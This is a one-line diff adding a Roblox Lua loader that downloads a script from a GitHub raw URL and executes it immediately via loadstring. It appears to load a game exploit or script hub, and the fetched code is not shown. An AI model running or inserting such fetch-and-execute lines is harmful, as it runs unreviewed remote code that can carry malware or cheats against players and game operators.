@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Camery12/JJs-Halloween/refs/heads/main/Script"))()
